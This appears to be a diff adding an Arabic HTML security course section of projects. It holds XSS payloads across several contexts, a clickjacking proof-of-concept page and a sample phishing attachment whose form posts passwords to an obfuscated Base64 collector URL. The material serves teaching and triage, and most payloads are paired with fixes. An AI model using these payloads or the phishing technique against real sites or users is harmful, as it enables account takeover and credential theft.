@@ -1,0 +1,518 @@
+      <section class="section" id="p-html" data-part="الجزء 1 · HTML" data-pk="html" data-nav="مشاريع الجزء الأول" data-icon="🛠️" data-keywords="projects portfolio writeup ctf template forms recon report xss contexts clickjacking poc parser puzzles phishing attachment triage ioc capstone">
+        <div class="section-head">
+          <span class="section-index">18</span>
+          <div>
+            <p class="eyebrow">HTML · مشاريع الجزء الأول</p>
+            <h2>المشاريع: من المعرفة للمهارة</h2>
+            <p class="lede">كل مشروع بيجمع دروس كتير في حاجة حقيقية هتستخدمها — نصهم شغل <b>مطوّر</b> (بروفايل، قالب writeup، فورمز، landing page منشورة) ونصهم شغل <b>pentester</b> (تقرير recon، PoCs، تحليل مرفق phishing). اعمل كل مشروع في VS Code (أو في 🧪 المعمل)، وبعدين قارن بالحل المرجعي. وفي الآخر <b>Capstone</b> بيتصحح أوتوماتيك.</p>
+          </div>
+        </div>
+
+        <div class="project open" data-ex="p01">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="true">
+            <span class="pnum">01</span><h4>بروفايل Pentester احترافي</h4><span class="lvl l1">أساسي</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>صفحة واحدة بتعرّف بيك كـ security researcher: semantic بالكامل، accessible، وبـ metadata صح. الدروس: 02، 03، 04، 05، 06، 07، 10، 12.</p>
+            <ol class="milestones">
+              <li><b>الهيكل</b>: DOCTYPE، <code>lang</code>، <code>charset</code> أول حاجة، viewport، title، description، و<code>header</code>/<code>nav</code>/<code>main</code>/<code>footer</code>.</li>
+              <li><b>Hero</b>: صورة (SVG أو data URI) بـ <code>alt</code> وأبعاد، و<code>h1</code> باسمك وسطر تعريفي.</li>
+              <li><b>المهارات</b>: <code>ul</code> متداخلة (Web → XSS، CSRF… / RE → x64dbg، Ghidra…).</li>
+              <li><b>الشهادات/الـ CTFs</b>: جدول بـ <code>caption</code> و<code>th scope</code> وتواريخ بـ <code>time datetime</code>.</li>
+              <li><b>التواصل</b>: <code>mailto:</code>، ولينكات خارجية بـ <code>target="_blank" rel="noopener noreferrer"</code>، وجوه <code>address</code>.</li>
+              <li><b>Stretch</b>: JSON-LD من نوع <code>Person</code>، وskip link، واختبرها بالكيبورد وLighthouse.</li>
+            </ol>
+            <div class="deliver"><b>التسليم:</b> <code>index.html</code> بيعدّي الـ W3C Validator من غير errors، وLighthouse Accessibility ≥ 95.</div>
+            <html-example file="profile.html" max="620">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1">
+                <title>Omar Hassan — Web & Malware Security</title>
+                <meta name="description" content="Penetration tester and malware analyst. Writeups, CTFs and tools.">
+                <style>
+                  body { font-family: system-ui, sans-serif; margin: 0; color: #1e293b; }
+                  header, main, footer { max-width: 760px; margin: auto; padding: 12px 18px; }
+                  nav ul { display: flex; gap: 14px; list-style: none; padding: 0; }
+                  table { border-collapse: collapse; } th, td { border: 1px solid #cbd5e1; padding: 4px 10px; }
+                  .skip { position: absolute; left: -999px; } .skip:focus { left: 8px; top: 8px; }
+                </style>
+                <script type="application/ld+json">
+                  { "@context": "https://schema.org", "@type": "Person", "name": "Omar Hassan",
+                    "jobTitle": "Penetration Tester", "url": "https://omar.example" }
+                </script>
+              </head>
+              <body>
+                <a class="skip" href="#main">Skip to content</a>
+                <header>
+                  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='64' height='64'%3E%3Crect width='64' height='64' rx='14' fill='%230b1322'/%3E%3Ctext x='32' y='42' font-size='26' text-anchor='middle' fill='%23ff7a45' font-family='monospace'%3EOH%3C/text%3E%3C/svg%3E"
+                       alt="Omar Hassan's initials logo" width="64" height="64">
+                  <h1>Omar Hassan</h1>
+                  <p>Penetration tester · Malware analyst · CTF player</p>
+                  <nav aria-label="Main">
+                    <ul><li><a href="#skills">Skills</a></li><li><a href="#certs">Certifications</a></li><li><a href="#contact">Contact</a></li></ul>
+                  </nav>
+                </header>
+                <main id="main">
+                  <section id="skills">
+                    <h2>Skills</h2>
+                    <ul>
+                      <li>Web: <ul><li>XSS &amp; HTML injection</li><li>CSRF &amp; clickjacking</li><li>Access control</li></ul></li>
+                      <li>Reverse engineering: <ul><li>x64dbg, Ghidra</li><li>Unpacking &amp; deobfuscation</li></ul></li>
+                    </ul>
+                  </section>
+                  <section id="certs">
+                    <h2>Certifications &amp; CTFs</h2>
+                    <table>
+                      <caption>Selected achievements</caption>
+                      <thead><tr><th scope="col">Name</th><th scope="col">Date</th></tr></thead>
+                      <tbody>
+                        <tr><td>CTF — Web category, 2nd place</td><td><time datetime="2026-03-14">Mar 2026</time></td></tr>
+                        <tr><td>Web security certification</td><td><time datetime="2026-07">Jul 2026</time></td></tr>
+                      </tbody>
+                    </table>
+                  </section>
+                </main>
+                <footer id="contact">
+                  <address>
+                    <a href="mailto:omar@omar.example">omar@omar.example</a> ·
+                    <a href="https://github.example/omar" target="_blank" rel="noopener noreferrer">GitHub</a>
+                  </address>
+                </footer>
+              </body>
+              </html>
+            </html-example>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p02">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">02</span><h4>قالب CTF Writeup</h4><span class="lvl l1">أساسي</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>قالب هتستخدمه لكل writeup: فهرس بلينكات داخلية، payloads معروضة كنص (escaped)، جدول flags، spoilers قابلة للفتح، وscreenshots في figures. الدروس: 03، 04، 05، 06، 07.</p>
+            <ol class="milestones">
+              <li><b>Metadata</b>: عنوان التحدي، الفئة، الصعوبة، والتاريخ (<code>time</code>) في <code>header</code> جوه <code>article</code>.</li>
+              <li><b>TOC</b>: <code>nav</code> فيه <code>ol</code> بلينكات <code>#recon</code> و<code>#exploit</code> و<code>#flag</code>، وكل section عليه الـ id المطابق.</li>
+              <li><b>Payloads</b>: كل payload في <code>pre &gt; code</code> مكتوب بالـ entities (ولا واحد يتنفّذ!).</li>
+              <li><b>Spoilers</b>: الـ flag والحل جوه <code>details</code>/<code>summary</code>.</li>
+              <li><b>Evidence</b>: <code>figure</code> + <code>figcaption</code> لكل screenshot.</li>
+            </ol>
+            <html-example file="writeup.html" max="620">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <title>Writeup — "Comment Box" (web, easy)</title>
+                <style>body{font-family:system-ui;max-width:720px;margin:auto;padding:10px 16px}pre{background:#0b1322;color:#e2e8f0;padding:10px;border-radius:8px;overflow:auto}</style>
+              </head>
+              <body>
+                <article>
+                  <header>
+                    <h1>Comment Box</h1>
+                    <p>Category: <b>web</b> · Difficulty: easy · Solved: <time datetime="2026-11-20">Nov 20, 2026</time></p>
+                  </header>
+                  <nav aria-label="Contents">
+                    <ol><li><a href="#recon">Recon</a></li><li><a href="#exploit">Exploitation</a></li><li><a href="#flag">Flag</a></li></ol>
+                  </nav>
+                  <section id="recon">
+                    <h2>Recon</h2>
+                    <p>The comment is reflected inside a <code>&lt;textarea&gt;</code> after saving.</p>
+                  </section>
+                  <section id="exploit">
+                    <h2>Exploitation</h2>
+                    <p>Close the RCDATA element first:</p>
+                    <pre><code>&lt;/textarea&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
+                    <figure>
+                      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='260' height='50'%3E%3Crect width='260' height='50' fill='%23f1f5f9'/%3E%3Ctext x='10' y='31' font-family='monospace' font-size='14'%3Ealert: ctf.example%3C/text%3E%3C/svg%3E"
+                           alt="Alert box showing ctf.example" width="260" height="50">
+                      <figcaption>Figure 1 — script executed on the challenge origin.</figcaption>
+                    </figure>
+                  </section>
+                  <section id="flag">
+                    <h2>Flag</h2>
+                    <details><summary>Show flag (spoiler)</summary><p><code>CTF{rcdata_is_not_a_wall}</code></p></details>
+                  </section>
+                </article>
+              </body>
+              </html>
+            </html-example>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p03">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">03</span><h4>Login + Registration: صح… وبعين المهاجم</h4><span class="lvl l2">متوسط</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>جزئين: (أ) تبني فورمين احترافيين، (ب) تكتب تحليل «إيه اللي بيتبعت وإيه اللي ممكن يتعدّى». الدروس: 08، 09، 12.</p>
+            <ol class="milestones">
+              <li><b>Login</b>: POST، <code>autocomplete="username"</code> و<code>"current-password"</code>، labels، «remember me» checkbox بقيمة صريحة، وhidden <code>csrf_token</code>.</li>
+              <li><b>Registration</b>: <code>fieldset</code>/<code>legend</code>، username بـ pattern، email، password بـ <code>minlength=12</code> و<code>"new-password"</code>، تأكيد الـ password، country select، terms (required)، وزرار «Show password» بـ <code>type="button"</code>.</li>
+              <li><b>ابعت كل فورم</b> في المعاينة/المعمل، وانسخ الـ HTTP request بالظبط.</li>
+              <li><b>التحليل</b>: جدول لكل قيد في المتصفح (required، pattern، maxlength، select، hidden…) وإزاي يتعدّى (DevTools / formnovalidate / Burp)، والـ check المطلوب في السيرفر.</li>
+              <li><b>Stretch</b>: ضيف <code>formaction</code> خبيث كأنه HTML injection واكتب الـ finding وإصلاحه (CSP <code>form-action</code> + encoding).</li>
+            </ol>
+            <html-example file="auth.html" url="https://shop.example/account/" max="620">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Account</title>
+              <style>body{font-family:system-ui}fieldset{margin:8px 0;border-radius:8px}label{display:block;margin:4px 0}</style></head>
+              <body>
+                <form action="/session" method="post" aria-labelledby="lh">
+                  <h2 id="lh">Sign in</h2>
+                  <input type="hidden" name="csrf_token" value="b3f1c9e2a7">
+                  <label>Username <input name="username" required autocomplete="username"></label>
+                  <label>Password <input name="password" type="password" required autocomplete="current-password"></label>
+                  <label><input type="checkbox" name="remember" value="1"> Remember me</label>
+                  <button>Sign in</button>
+                </form>
+                <form action="/register" method="post">
+                  <fieldset>
+                    <legend>Create account</legend>
+                    <input type="hidden" name="csrf_token" value="b3f1c9e2a7">
+                    <label>Username <input name="username" required pattern="[a-z0-9_]{3,16}" autocomplete="username"></label>
+                    <label>Email <input name="email" type="email" required autocomplete="email"></label>
+                    <label>Password <input id="pw" name="password" type="password" required minlength="12" autocomplete="new-password"></label>
+                    <label>Confirm <input name="password2" type="password" required minlength="12" autocomplete="new-password"></label>
+                    <button type="button" onclick="pw.type = pw.type === 'password' ? 'text' : 'password'">Show password</button>
+                    <label>Country
+                      <select name="country"><option value="eg">Egypt</option><option value="sa">Saudi Arabia</option><option value="ma">Morocco</option></select>
+                    </label>
+                    <label><input type="checkbox" name="terms" value="accepted" required> I accept the terms</label>
+                    <button>Create account</button>
+                  </fieldset>
+                </form>
+              </body>
+              </html>
+            </html-example>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p04">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">04</span><h4>تقرير Recon لـ MegaCorp</h4><span class="lvl l2">متوسط</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>خد الـ source بتاع MegaCorp من الدرس 15، وحوّل كل ملاحظة لـ finding في تقرير HTML احترافي. الدروس: 05، 10، 15.</p>
+            <ol class="milestones">
+              <li><b>Executive summary</b>: فقرتين — النطاق، وأهم 3 ملاحظات.</li>
+              <li><b>جدول findings</b>: ID، العنوان، المكان (URL/سطر)، الدليل (في <code>code</code>)، الخطورة (Info/Low/Medium/High)، والتوصية.</li>
+              <li><b>الخطورة بمنطق</b>: إصدار CMS قديم ≠ تسريب AWS key ≠ endpoint قديم. برّر كل تقييم.</li>
+              <li><b>Next steps</b>: قايمة اختبارات نشطة هتعملها (جوه الـ scope) لكل finding.</li>
+            </ol>
+            <html-example file="recon-report.html" max="620">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Recon report — partners.megacorp.example</title>
+              <style>body{font-family:system-ui;max-width:900px;margin:auto;padding:10px}table{border-collapse:collapse;width:100%}th,td{border:1px solid #cbd5e1;padding:5px 8px;text-align:left;vertical-align:top}th{background:#f8fafc}</style></head>
+              <body>
+                <h1>Passive recon — partners.megacorp.example</h1>
+                <p><b>Scope:</b> partners.megacorp.example (login page and its static assets). <b>Date:</b> <time datetime="2026-11-21">Nov 21, 2026</time>.</p>
+                <table>
+                  <caption>Findings</caption>
+                  <thead><tr><th scope="col">ID</th><th scope="col">Finding</th><th scope="col">Evidence</th><th scope="col">Severity</th><th scope="col">Recommendation</th></tr></thead>
+                  <tbody>
+                    <tr><td>R-01</td><td>Unsupported CMS version disclosed</td><td><code>meta generator: Joomla! 3.9.27</code></td><td>Medium</td><td>Upgrade; remove generator meta and version query strings.</td></tr>
+                    <tr><td>R-02</td><td>Development API host referenced from production</td><td><code>data-api="https://api-dev.megacorp.example/v2"</code></td><td>Medium</td><td>Point production at the production API; restrict dev hosts.</td></tr>
+                    <tr><td>R-03</td><td>Legacy SOAP auth endpoint disclosed in comment</td><td><code>/services/LegacyAuth.asmx</code></td><td>Low (pending tests)</td><td>Remove comment; verify rate limiting/MFA parity or retire the service.</td></tr>
+                    <tr><td>R-04</td><td>Client-side only admin gating</td><td><code>localStorage.portal_role === "superuser"</code></td><td>Info (pending tests)</td><td>Enforce authorization on <code>/internal/reports/export</code> server-side.</td></tr>
+                    <tr><td>R-05</td><td>Source map and credential identifier in JS</td><td><code>portal.min.js.map</code>, <code>AWS_ID = "AKIA…"</code></td><td>Low → High if secrets found</td><td>Do not deploy source maps; move cloud credentials to the backend and rotate.</td></tr>
+                  </tbody>
+                </table>
+              </body>
+              </html>
+            </html-example>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p05">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">05</span><h4>دفتر الـ Contexts: ثغرة وإصلاحها في 5 أماكن</h4><span class="lvl l3">متقدم</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>صفحة مرجعية ليك: لكل context (body، attribute بـ quotes، attribute من غير quotes، JS string، URL) — الكود الضعيف، الـ payload، ليه شغّال، والكود المصلّح. <b>شرط صارم</b>: ولا payload يتنفّذ في الصفحة نفسها. الدروس: 13، 14، 16.</p>
+            <ol class="milestones">
+              <li>لكل context: <code>figure</code> فيه <code>pre</code> للكود الضعيف، و<code>pre</code> للـ payload، وشرح، و<code>pre</code> للإصلاح.</li>
+              <li>كل الـ HTML المعروض <b>escaped</b> (افتح 🌳 DOM: لازم مايبقاش فيه ولا <code>img</code> ولا <code>script</code> زيادة).</li>
+              <li>اختبر كل payload في الـ XSS Range أو المعمل قبل ما تكتبه.</li>
+              <li><b>Stretch</b>: ضيف context سادس (comment أو RCDATA) وسابع (event handler).</li>
+            </ol>
+            <html-example file="contexts-notebook.html" max="620">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>XSS contexts notebook</title>
+              <style>body{font-family:system-ui;max-width:860px;margin:auto}figure{border:1px solid #cbd5e1;border-radius:10px;padding:8px 12px;margin:10px 0}pre{background:#0b1322;color:#e2e8f0;padding:8px;border-radius:6px;white-space:pre-wrap}.bad{border-left:4px solid #e11d48}.good{border-left:4px solid #16a34a}</style></head>
+              <body>
+                <h1>XSS contexts notebook</h1>
+                <figure>
+                  <figcaption><b>1 · Quoted attribute</b></figcaption>
+                  <pre class="bad">&lt;input value="${q}"&gt;</pre>
+                  <p>Payload: <code>" autofocus onfocus="alert(document.domain)</code> — the raw <code>"</code> closes the value.</p>
+                  <pre class="good">&lt;input value="${htmlEscape(q)}"&gt;   // escapes &amp; &lt; &gt; " '</pre>
+                </figure>
+                <figure>
+                  <figcaption><b>2 · JavaScript string</b></figcaption>
+                  <pre class="bad">&lt;script&gt;var q = '${q.replace("'", "\\'")}';&lt;/script&gt;</pre>
+                  <p>Payload: <code>\';alert(1)//</code> (backslash not escaped) or <code>&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</code>.</p>
+                  <pre class="good">&lt;script type="application/json" id="q"&gt;${JSON.stringify(q).replace(/&lt;/g, "\\u003c")}&lt;/script&gt;</pre>
+                </figure>
+                <figure>
+                  <figcaption><b>3 · URL attribute</b></figcaption>
+                  <pre class="bad">&lt;a href="${site}"&gt;</pre>
+                  <p>Payload: <code>java&amp;#x09;script:alert(1)</code> — no special HTML characters needed.</p>
+                  <pre class="good">const u = new URL(site); if (!["https:", "http:"].includes(u.protocol)) reject();</pre>
+                </figure>
+              </body>
+              </html>
+            </html-example>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p06">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">06</span><h4>PoC Kit: Clickjacking + Form hijacking</h4><span class="lvl l3">متقدم</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>صفحتين PoC جاهزين تحطهم في أي تقرير (بعد ما تغيّر الـ URL): واحدة clickjacking بـ slider للشفافية، وواحدة توضّح form hijacking. الدروس: 09، 11، 16.</p>
+            <ol class="milestones">
+              <li><b>Clickjacking</b>: iframe للـ target فوق زرار طُعم، مع <code>input type="range"</code> بيغيّر الـ opacity (عشان العميل يشوف الطبقتين)، ونص بيشرح الخطوات.</li>
+              <li><b>إثبات إن الـ framing ممكن</b>: لو الـ iframe فضي/رفض، اكتب في التقرير الـ headers اللي منعته.</li>
+              <li><b>Form hijack</b>: صفحة فيها فورم «حقيقية» + الـ injection (زرار بـ <code>form</code> و<code>formaction</code>)، والـ request الناتج.</li>
+              <li><b>Remediation</b> في الصفحة نفسها: <code>frame-ancestors</code>، <code>form-action</code>، encoding.</li>
+            </ol>
+            <html-example file="cj-kit.html" url="https://pentest-poc.example/cj.html" max="400">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Clickjacking PoC</title>
+              <style>
+                body{font-family:system-ui}
+                .stage{position:relative;width:340px;height:170px;border:1px dashed #94a3b8}
+                .decoy{position:absolute;left:90px;top:110px;padding:8px 16px;border:0;border-radius:8px;background:#16a34a;color:#fff;font-weight:700}
+                #target{position:absolute;inset:0;width:340px;height:170px;border:0;z-index:2;opacity:.3}
+              </style></head>
+              <body>
+                <h3>Clickjacking PoC — target: bank.example/settings</h3>
+                <label>Target opacity <input id="op" type="range" min="0" max="1" step="0.05" value="0.3"></label>
+                <div class="stage">
+                  <button class="decoy">Claim your prize</button>
+                  <iframe id="target" title="framed target" srcdoc="<body style='margin:0;font-family:system-ui'><p style='margin:8px'><b>Bank</b> settings</p><button style='position:absolute;left:90px;top:110px;padding:8px 16px;border:0;border-radius:8px;background:#e11d48;color:#fff;font-weight:700'>Delete account</button></body>"></iframe>
+                </div>
+                <p>Steps: 1) victim is logged in to bank.example 2) opens this page 3) clicks the decoy → the click lands on «Delete account».</p>
+                <script>
+                  document.getElementById("op").addEventListener("input", e => {
+                    document.getElementById("target").style.opacity = e.target.value;
+                  });
+                </script>
+              </body>
+              </html>
+            </html-example>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p07">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">07</span><h4>ألغاز الـ Parser</h4><span class="lvl l3">متقدم</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>لكل لغز: اكتب أقصر HTML ينتج الـ DOM المطلوب، واتأكد بالـ Parser Playground (الدرس 13). الهدف إنك تتنبأ بالـ parser من غير ما تجرّب.</p>
+            <ol class="milestones">
+              <li><code>&lt;div&gt;</code> مكتوب بعد <code>&lt;p&gt;</code> مفتوحة يطلع <b>أخوها</b> مش ابنها — من غير ما تكتب <code>&lt;/p&gt;</code>.</li>
+              <li><code>&lt;i&gt;</code> يظهر <b>مرتين</b> في الـ DOM مع إنك كتبته مرة واحدة (adoption agency).</li>
+              <li>نص مكتوب جوه <code>&lt;table&gt;</code> يطلع قبلها (foster parenting).</li>
+              <li><code>&lt;img&gt;</code> مكتوب جوه <code>&lt;svg&gt;</code> يطلع برّاه.</li>
+              <li>الـ input واقع هنا: <code>&lt;title&gt;INPUT&lt;/title&gt;</code>. اكتب INPUT بحيث يتعمل <code>&lt;b&gt;</code> حقيقي في الصفحة (تلميح: اقفل الـ RCDATA).</li>
+              <li>نفس النص يدّي DOM مختلف حسب الـ scripting flag (noscript).</li>
+            </ol>
+            <code-block lang="html" file="solutions.html">
+              <!-- 1 --> <p>one<div>two</div>                          <!-- the div start tag closes the open p: result is p, div (siblings) -->
+              <!-- 2 --> <b><i>x</b>y</i>                              <!-- <b><i>x</i></b><i>y</i> -->
+              <!-- 3 --> <table>fostered<tr><td>c</td></tr></table>     <!-- "fostered" text moves before the table -->
+              <!-- 4 --> <svg><img alt="out"></svg>                     <!-- img is a breakout element -->
+              <!-- 5 --> <title></title><b>real</b></title>            <!-- INPUT = </title><b>real</b> ; the leftover </title> is ignored -->
+              <!-- 6 --> <noscript><p title="</noscript><b>x</b>"></noscript>
+            </code-block>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p08">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">08</span><h4>🦠 Triage لمرفق Phishing بصيغة HTML</h4><span class="lvl l3">متقدم</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>مرفق اسمه <code>Shared_Document.html</code> وصل لموظف. شغلك: تحليل static الأول، بعدين «تفجير» آمن في sandbox التحليل (مفيش network، وكل sink بيتسجّل)، وفي الآخر قايمة IOCs. الدروس: 06، 10، 14، 15. (العينة دي تعليمية ومن تأليفنا، والدومينات من نطاق التوثيق <code>.example</code>.)</p>
+            <ol class="milestones">
+              <li><b>Static</b>: اقرا الملف كنص. علّم كل حاجة مشبوهة: refresh، data URI، hidden inputs، strings متقسّمة، <code>atob</code>/<code>unescape</code>/<code>document.write</code>.</li>
+              <li><b>Decode</b>: فك الطبقات بالـ Encoder (الدرس 14) من غير تشغيل.</li>
+              <li><b>Detonate</b>: دوس «🧪 شغّل في sandbox التحليل» وقارن الـ sinks باللي فكّيته بإيدك.</li>
+              <li><b>IOCs</b>: جدول بالـ domains/URLs، الـ victim identifiers، الـ lure text، والتقنيات (techniques).</li>
+            </ol>
+            <task id="p08-t1" title="فين الـ passwords بتروح؟" level="3" answer="https://collect.phish-kit.example/gt.php">
+              <desc><p>بعد التحليل: الفورم بتبعت الـ password على أنهي <b>URL</b> بالظبط؟</p></desc>
+              <listing lang="html" file="Shared_Document.html" detonate url="file:///C:/Users/a.hassan/Downloads/Shared_Document.html">
+                <!DOCTYPE html>
+                <html>
+                <head>
+                  <meta charset="UTF-8">
+                  <title>Secure Document — Shared with you</title>
+                  <meta http-equiv="refresh" content="600; url=https://www.office.example/">
+                </head>
+                <body style="font-family:Segoe UI,sans-serif;background:#f3f2f1;padding:20px">
+                  <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHdpZHRoPSc0MCcgaGVpZ2h0PSc0MCc+PHJlY3Qgd2lkdGg9JzQwJyBoZWlnaHQ9JzQwJyByeD0nNicgZmlsbD0nIzAwNzhkNCcvPjwvc3ZnPg==" alt="" width="40">
+                  <h3>Sign in to view the shared document</h3>
+                  <form id="f" method="post">
+                    <input type="hidden" name="victim" value="a.hassan@shop.example">
+                    <input name="pw" type="password" placeholder="Password">
+                    <button>View document</button>
+                  </form>
+                  <script>
+                    var k = ["aHR0cHM6Ly9jb2xsZWN0", "LnBoaXNoLWtpdC5leGFt", "cGxlL2d0LnBocA=="];
+                    document.getElementById("f").action = atob(k.join(""));
+                    document.write(unescape("%3Cp%20style%3D%22color%3A%23605e5c%22%3EYour%20session%20expires%20in%205%20minutes.%3C%2Fp%3E"));
+                  </script>
+                </body>
+                </html>
+              </listing>
+              <hint>الـ 3 أجزاء في `k` لما يتلزقوا = Base64 واحد. أو شغّله في الـ sandbox وشوف الـ `atob → decoded`.</hint>
+              <explain>`https://collect.phish-kit.example/gt.php`. التقنيات: (1) الـ URL متقسّم Base64 عشان ميتلاقيش بـ string search، (2) الـ `action` بيتحط بالـ JS وقت التشغيل (الـ HTML الخام مفيهوش وجهة)، (3) الـ lure text معمول بـ `document.write(unescape(…))`، (4) اللوجو data URI (مفيش request لموقع البراند)، (5) hidden input فيه إيميل الضحية (الحملة متخصصة لكل مستلم)، (6) meta refresh بعد 10 دقايق لموقع شرعي عشان الصفحة «تختفي» لو اتسابت مفتوحة. الـ IOCs: `collect.phish-kit.example`، المسار `/gt.php`، والـ lure «Secure Document — Shared with you».</explain>
+            </task>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <div class="project" data-ex="p09">
+          <div class="project-head" role="button" tabindex="0" aria-expanded="false">
+            <span class="pnum">09</span><h4>👨‍💻 Landing page منشورة على الإنترنت</h4><span class="lvl l2">متوسط</span><span class="arrow">▼</span>
+          </div>
+          <div class="project-body">
+            <p>مشروع مطوّر كامل: صفحة هبوط لمنتج (أداة security مثلًا) بكل الأقسام اللي بتشوفها في أي موقع حقيقي — ومنشورة على رابط حقيقي. الدروس: 02–12 و17. (هتحسّن شكلها بالـ CSS في الجزء التاني.)</p>
+            <ol class="milestones">
+              <li><b>المشروع</b>: فولدر بالهيكل من الدرس 17 (<code>css/</code>، <code>js/</code>، <code>img/</code>، <code>404.html</code>)، وGit repo بـ commits صغيرة واضحة.</li>
+              <li><b>الأقسام</b>: header + nav (لينكات <code>#features</code> <code>#pricing</code> <code>#faq</code> <code>#contact</code>)، hero بـ h1 وزرار CTA، features (3 كروت <code>article</code>)، جدول pricing، FAQ بـ <code>details</code>، فورم تواصل، footer.</li>
+              <li><b>الجودة</b>: meta tags كاملة (description، Open Graph، canonical)، favicon، صور بـ <code>alt</code> وأبعاد و<code>loading="lazy"</code>، وLighthouse ≥ 90 في Accessibility وSEO.</li>
+              <li><b>النشر</b>: GitHub Pages أو Netlify، واتأكد إن كل المسارات شغّالة بعد النشر (الحروف الكبيرة!).</li>
+              <li><b>الأمن من الأول</b>: مفيش inline handlers، الفورم POST، اللينكات الخارجية <code>rel="noopener noreferrer"</code>، و(على Netlify/Cloudflare) ملف <code>_headers</code> فيه <code>X-Frame-Options: DENY</code> و<code>Referrer-Policy</code>.</li>
+            </ol>
+            <html-example file="landing.html" url="https://scanly.example/" max="620">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1">
+                <title>Scanly — find exposed secrets before attackers do</title>
+                <meta name="description" content="Scanly scans your repos and sites for leaked keys, source maps and debug endpoints.">
+                <meta property="og:title" content="Scanly">
+                <link rel="canonical" href="https://scanly.example/">
+                <style>body{font-family:system-ui;margin:0}header,main,footer{max-width:820px;margin:auto;padding:10px 16px}nav a{margin-inline-end:12px}.features{display:flex;gap:10px}.features article{flex:1;border:1px solid #e2e8f0;border-radius:10px;padding:8px}table{border-collapse:collapse}td,th{border:1px solid #cbd5e1;padding:4px 10px}</style>
+              </head>
+              <body>
+                <header>
+                  <nav aria-label="Main"><a href="#features">Features</a><a href="#pricing">Pricing</a><a href="#faq">FAQ</a><a href="#contact">Contact</a></nav>
+                  <h1>Find exposed secrets before attackers do</h1>
+                  <p><a href="#contact">Request a demo →</a></p>
+                </header>
+                <main>
+                  <section id="features" class="features" aria-label="Features">
+                    <article><h2>Secret scanning</h2><p>API keys, tokens and passwords in code and history.</p></article>
+                    <article><h2>Source maps</h2><p>Detect <code>.map</code> files deployed to production.</p></article>
+                    <article><h2>Debug endpoints</h2><p>Flags <code>/debug</code>, <code>.git/</code> and <code>.env</code>.</p></article>
+                  </section>
+                  <section id="pricing">
+                    <h2>Pricing</h2>
+                    <table><caption>Monthly plans</caption>
+                      <thead><tr><th scope="col">Plan</th><th scope="col">Repos</th><th scope="col">Price</th></tr></thead>
+                      <tbody><tr><td>Free</td><td>3</td><td>$0</td></tr><tr><td>Team</td><td>50</td><td>$29</td></tr></tbody>
+                    </table>
+                  </section>
+                  <section id="faq">
+                    <h2>FAQ</h2>
+                    <details><summary>Do you store our code?</summary><p>No — scans run in an isolated worker and results only keep file paths.</p></details>
+                  </section>
+                  <section id="contact">
+                    <h2>Contact</h2>
+                    <form action="/demo" method="post">
+                      <label>Work email <input type="email" name="email" required autocomplete="email"></label>
+                      <button>Request demo</button>
+                    </form>
+                  </section>
+                </main>
+                <footer><small>© 2026 Scanly · <a href="https://status.scanly.example" target="_blank" rel="noopener noreferrer">Status</a></small></footer>
+              </body>
+              </html>
+            </html-example>
+            <button class="btn btn-sm btn-ghost btn-done" type="button">علّم المشروع كمكتمل</button>
+          </div>
+        </div>
+
+        <h3 class="sub">🏁 Capstone: صفحة تسجيل آمنة (بتتصحح أوتوماتيك)</h3>
+        <html-lab id="p-capstone" title="Secure signup page" level="3" url="https://shop.example/signup">
